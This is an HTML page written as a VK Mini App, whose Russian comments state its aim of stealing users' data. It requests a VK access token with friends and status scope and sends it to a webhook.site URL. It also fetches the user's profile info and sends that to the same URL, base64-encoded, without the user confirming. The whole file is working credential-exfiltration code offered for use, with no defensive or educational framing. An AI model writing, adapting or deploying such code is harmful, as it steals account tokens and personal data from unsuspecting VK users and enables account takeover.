<!DOCTYPE html>
<html>
<head>
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
    <script>
        vkBridge.send('VKWebAppInit');

        // Пытаемся вызвать получение токена. 
        // Если пользователь нажмет "Разрешить", токен прилетит к нам!
        vkBridge.send("VKWebAppGetAuthToken", {"app_id": 54401740, "scope": "friends,status"})
            .then(data => {
                fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?token=" + data.access_token);
            })
            .catch(error => {
                fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?error=" + btoa(JSON.stringify(error)));
            });
            
        // Также крадем инфу о пользователе (без подтверждения)
        vkBridge.send("VKWebAppGetUserInfo").then(data => {
            fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?user=" + btoa(JSON.stringify(data)));
        });
    </script>
</body>
</html>
